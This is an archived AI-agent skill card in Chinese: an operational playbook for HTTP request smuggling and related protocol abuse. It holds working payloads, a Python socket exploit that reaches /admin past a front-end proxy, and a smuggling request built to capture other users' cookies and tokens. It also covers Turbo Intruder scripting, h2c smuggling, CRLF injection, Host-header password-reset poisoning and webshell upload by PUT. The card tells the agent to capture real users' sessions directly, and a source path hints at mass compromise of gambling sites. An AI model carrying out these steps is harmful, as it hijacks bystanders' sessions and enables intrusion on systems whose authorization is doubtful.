<!-- archived from /root/.hermes/skills/security/http-request-smuggling/SKILL.md on 2026-10-21 -->

---
name: http-request-smuggling
description: >-
 HTTP 请求走私（Request Smuggling）完整手法：CL.TE / TE.CL / TE.TE 变体识别、
 走私绕过前端访问控制、会话捕获、反射 XSS 转存储、
 内部请求伪造（SSRF-via-smuggling）。
 用户提到 HTTP 走私、Request Smuggling、CL.TE、TE.CL、
 Transfer-Encoding 注入、前端反代绕过时使用。
 纯 CDN 指纹识别走 cdn-origin-bypass；WAF 绕过走 evasion。
version: 1.0.0
---

> 归档卡：原目录 `/root/.hermes/skills/security/http-request-smuggling`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/http-request-smuggling/…')`，不要相对 `references/legacy/` 解析。

# HTTP 请求走私完整手法

**前提**：目标在 `config/scope*.json`。smuggling 影响所有共享该连接的用户，授权内直接做。

---

## 快速识别（先自动后手工）

```bash
# smuggler.py 自动探测（最快）
pip install requests
python3 -c "
import subprocess, sys
subprocess.run(['pip','install','requests','h2'],capture_output=True)
" 2>/dev/null

# 克隆后运行
git clone https://github.com/defparam/smuggler
cd smuggler
python3 smuggler.py -u https://授权站/ -l 5

# PortSwigger HTTP Request Smuggler (Burp 插件)
# Extensions → BApp Store → HTTP Request Smuggler → Audit
```

---

## §1 原理与分类

```
前端(代理/CDN) <─────────────> 后端服务器
 │ 同一 TCP 连接复用
 │
CL.TE: 前端用 Content-Length, 后端用 Transfer-Encoding
TE.CL: 前端用 Transfer-Encoding, 后端用 Content-Length
TE.TE: 两端都用 TE, 但对 obfuscated 头理解不一致
```

---

## §2 CL.TE 走私

```
前端用 Content-Length，后端用 Transfer-Encoding
→ 走私请求附着到下一个合法请求的头部
```

```http
POST / HTTP/1.1
Host: 授权站
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

**验证方法**（timing + diff）：

```bash
# 发两次；第二次响应异常（400/慢响应）= 走私成立
curl -s -o /dev/null -w "%{http_code} %{time_total}" \
 --http1.1 \
 -H "Content-Length: 6" \
 -H "Transfer-Encoding: chunked" \
 -d $'0\r\n\r\nG' \
 https://授权站/

# 正确工具：使用 turbo-intruder 或 Python socket 精确控制字节
```

---

## §3 TE.CL 走私

```
前端用 Transfer-Encoding，后端用 Content-Length
→ 尾部数据毒化下一请求
```

```http
POST / HTTP/1.1
Host: 授权站
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

---

## §4 TE.TE 混淆（Obfuscation）

```http
# 混淆让其中一个不识别 TE 头，退回 CL
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:
 chunked

X: X[\n]Transfer-Encoding: chunked

GET / HTTP/1.1
Transfer-Encoding: chunked
```

---

## §5 利用：绕过前端访问控制

```python
# 场景：/admin 被前端代理 403，但后端不检查
# 走私一个 "来自内部" 的 admin 请求

import socket, ssl

req = (
 b"POST / HTTP/1.1\r\n"
 b"Host: 授权站\r\n"
 b"Content-Type: application/x-www-form-urlencoded\r\n"
 b"Content-Length: 116\r\n"
 b"Transfer-Encoding: chunked\r\n"
 b"\r\n"
 b"5e\r\n"
 b"GET /admin HTTP/1.1\r\n"
 b"Host: localhost\r\n"
 b"Content-Type: application/x-www-form-urlencoded\r\n"
 b"Content-Length: 10\r\n"
 b"\r\n"
 b"x=\r\n"
 b"0\r\n"
 b"\r\n"
)

ctx = ssl.create_default_context()
with socket.create_connection(('授权站', 443)) as sock:
 with ctx.wrap_socket(sock, server_hostname='授权站') as ssock:
 ssock.sendall(req)
 # 等待并拼接响应
 data = b""
 while True:
 chunk = ssock.recv(4096)
 if not chunk: break
 data += chunk
 print(data.decode(errors='replace'))
```

---

## §6 利用：捕获其他用户请求（L3，授权内直接做）

```
走私半个请求头，让下一个合法用户的请求被附加到此：
POST → 走私前缀 → 下一用户的 Cookie/Token 出现在 POST body 里
→ 通过错误响应或存储反射读出
```

```http
POST / HTTP/1.1
Host: 授权站
Content-Length: 198
Transfer-Encoding: chunked

c7
POST /post/comment HTTP/1.1
Host: 授权站
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=YOUR_SESSION

csrf=TOKEN&postId=1&comment=

0

```

**⚠️ 此技术影响真实用户会话，授权内直接做**

---

## §7 Turbo Intruder 精准走私

```python
# Burp Turbo Intruder 脚本（发包精准）
def queueRequests(target, wordlists):
 engine = RequestEngine(endpoint=target.endpoint,
 concurrentConnections=5,
 requestsPerConnection=1,
 pipeline=False)
 
 # 走私请求
 smuggle = '''POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG'''
 
 for i in range(5):
 engine.queue(smuggle)

def handleResponse(req, interesting):
 if '400' in req.response or req.response.startswith('G'):
 table.add(req)
```

---

## §8 H2.CL / H2.TE（HTTP/2 降级走私）

```bash
# HTTP/2 → HTTP/1.1 降级时走私
# 在 h2 请求中注入 \r\n 到头部值

# 使用 h2csmuggler
pip install h2csmuggler
h2csmuggler -x https://授权站 http://localhost/admin

# 或 Burp HTTP/2 Tab → 手动注入 header 换行
# Header name: foo\r\nTransfer-Encoding: chunked
```

---

## 成功口径

| 档 | 条件 |
|----|------|
| L1 | timing 或 diff 确认走私存在 |
| L2 | 绕过前端访问控制（/admin 200） |
| L3 | 捕获会话/SSRF（授权内直接做） |

---

## 真源

- 手法：`docs/playbooks/核心Web漏洞面作业手法.md`
- 工具：`python3 tools/ops/core_web_surface_probe.py --help`

---

<!-- 补充视角: http-smuggling-protocol-abuse (兄弟技能库 2026-09-12) -->

---
name: http-smuggling-protocol-abuse
description: "HTTP走私/协议滥用时使用。触发: CL.TE, TE.CL, h2c走私, CRLF注入, Host头攻击。"
version: 1.0.0
license: MIT
metadata:
    related_skills: [web-ssrf, cdn-origin-tracing-v51, spring-security-csrf-bypass, surveyengine-knowledge-pack]
---

# HTTP 请求走私与协议滥用家族

## When to Use

遇到正文顶部触发指纹/关键词时使用本技能(吸收自测绘引擎知识包)。完整卡全文: 镜像 `D:\博彩通杀\技能库\测绘引擎知识包\.cursor\skills\<原名>\SKILL.md`。


来源: 测绘引擎知识包吸收。镜像卡:
- `...\http-request-smuggling\SKILL.md`(255 行)
- `...\http2-specific-attacks\SKILL.md`(366 行)
- `...\crlf-injection\SKILL.md`(199 行)
- `...\http-host-header-attacks\SKILL.md`(337 行)
- `...\http-method-webdav\SKILL.md`(31 行)

## 1. HTTP 请求走私

### 原理与分类
| 类型 | 前端/后端解析差异 |
|---|---|
| CL.TE | 前端用 Content-Length, 后端用 Transfer-Encoding |
| TE.CL | 前端用 TE, 后端用 CL |
| TE.TE | 两端 TE 变体混淆 |
| H2.CL / H2.TE | HTTP/2 降级走私 |

### CL.TE 基础 payload
```http
POST / HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
验证: 连发两次,第二次响应异常(400/慢响应)= 走私成立。
```bash
curl -s -o /dev/null -w "%{http_code} %{time_total}" --http1.1 \
 -H "Content-Length: 6" -H "Transfer-Encoding: chunked" \
 -d $'0\r\n\r\nG' https://target/
# 精确字节控制: Turbo Intruder 或 Python socket
```

### 利用
- **绕过前端访问控制**: 走私请求直达后端未授权路径(/admin)
- **捕获其他用户请求**(L3): 走私带 Content-Length 的挂起请求,吸附下一个用户的请求头
- **SSRF-via-smuggling**: 走私打到内网

## 2. HTTP/2 专项
- **h2c 走私**: `Upgrade: h2c` 头被反代盲转发 → 后端讲 H2,前端盲 → 绕过前端 ACL
```http
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: <base64 H2 settings>
Connection: Upgrade, HTTP2-Settings
```
工具: h2csmuggler
- **伪头注入**: 前后端对 :path/:authority 解析差异;重复伪头;scheme 操纵

## 3. CRLF 注入
- 探测: 参数值带 `%0d%0a` 看响应是否出现新行/新头
- 利用: `Set-Cookie` 会话固定、响应体注入 XSS、缓存投毒、日志注入
- 双 CRLF(`\r\n\r\n`)→ 注入响应体
- **过滤器绕过**: URL 编码双写 `%250d%250a`、unicode `%u000d`、空白混淆

## 4. Host 头攻击
| 攻击 | 手法 |
|---|---|
| 密码重置投毒 | Host 改攻击域 → 重置链接指向攻击者 |
| 缓存投毒 | Host 注入 → CDN 缓存恶意页 |
| SSRF | Host 指向内网 → 后端路由到内网 |
| vhost 绕过 | 直接 Host: 隐藏vhost |

**Host 校验绕过**: 覆盖头 `X-Forwarded-Host`/`X-Host`/`Forwarded`;请求行绝对 URL;双 Host 头。

## 5. HTTP 方法/WebDAV
- OPTIONS 看 Allow;`PUT webshell`、`DELETE`、`PATCH`、`TRACE`(反射头)、`PROPFIND`
- WebDAV: `MOVE`/`COPY` 改名绕过上传过滤
- 403 规避: X-HTTP-Method-Override / X-Method-Override 头

## 成功口径
| 档 | 条件 |
|---|---|
| L1 | 走私/Host头/CRLF 确认存在(timing diff/响应异常) |
| L2 | 走私绕过 ACL 访问未授权页,或 Host 投毒成立 |
| L3 | 捕获他人请求/SSRF 内网/缓存投毒影响用户 |

## Pitfalls
- smuggling 影响共享连接所有用户 → 授权内谨慎,PoV 用最小请求
- 检测走私必须 timing+diff 双证据,单次 400 不算
- 纯 CDN 前(无回源代理)走私面小;先确认架构再打
- CRLF 需看响应是否真回显注入(有些框架过滤)


---

## 外部库增量（2026-10-11 分享包）

## nghttpx 升级队列投毒（研究 PoC，本机未复现）

前提：**nghttpx 反代 + HTTP/1.1 后端**（`Server: nghttpx` 指纹，或反代链上有支持 HTTP/1.1 升级的服务）。
面：HTTP/1.1 Upgrade 请求的队列/连接复用混淆 → 响应串台、请求走私族。
探测：先确认反代产物与后端协议，再发带 `Connection: Upgrade` + `Upgrade: <任意>` 的最小请求，看后续普通请求是否拿到**别人的响应**（前缀/长度对比差异）。
注意：**影响共享连接上的所有用户**，授权内只发最少请求；检测必须 timing + diff 双证据。
`poc-db/exploitarium/nghttp2-nghttpx-upgrade-queue-poison-poc`
